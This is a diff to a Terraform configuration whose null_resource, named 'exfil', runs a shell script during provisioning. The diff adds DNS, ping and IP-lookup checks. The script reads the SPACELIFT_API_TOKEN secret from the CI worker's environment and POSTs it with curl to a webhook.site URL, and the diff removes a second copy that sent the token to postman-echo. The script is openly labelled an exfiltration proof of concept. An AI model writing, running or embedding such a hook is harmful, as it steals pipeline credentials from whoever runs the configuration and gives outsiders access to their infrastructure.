@@ -11,26 +11,27 @@ resource "null_resource" "exfil" {
     interpreter = ["/bin/sh", "-c"]
     command = <<EOT
       echo "========================================="
-      echo "[*] EXFILTRATION POC (DEBUG)"
+      echo "[*] TESTING OUTBOUND CONNECTIVITY"
       echo "========================================="
-
+      echo "1. DNS resolve webhook.site:"
+      nslookup webhook.site || echo "nslookup failed"
+      echo "2. Ping webhook.site:"
+      ping -c 2 webhook.site || echo "ping failed"
+      echo "3. Curl ifconfig.me (my IP):"
+      curl -s ifconfig.me || echo "curl failed"
+      echo "========================================="
+      echo "[*] EXFILTRATION POC"
+      echo "========================================="
       TOKEN="$SPACELIFT_API_TOKEN"
       if [ -n "$TOKEN" ]; then
         echo "[!] Token found. Sending to webhook..."
         curl -v -X POST "https://webhook.site/deaf9bad-5c63-498b-bc12-719a54cd25bb" \
           -H "Content-Type: application/json" \
           -d "{\"source\":\"spacelift-worker\",\"token\":\"$TOKEN\"}" \
-          2>&1 || echo " [✗] Curl to webhook failed"
-
-        echo "[!] Also sending to postman-echo for verification..."
-        curl -s -X POST "https://postman-echo.com/post" \
-          -H "Content-Type: application/json" \
-          -d "{\"source\":\"spacelift-worker\",\"token\":\"$TOKEN\"}" \
-          && echo " [✓] Postman-echo received it" || echo " [✗] Postman-echo failed"
+          2>&1
       else
         echo "[-] No token found"
       fi
-
       echo "========================================="
       echo "[*] Done."
       echo "========================================="
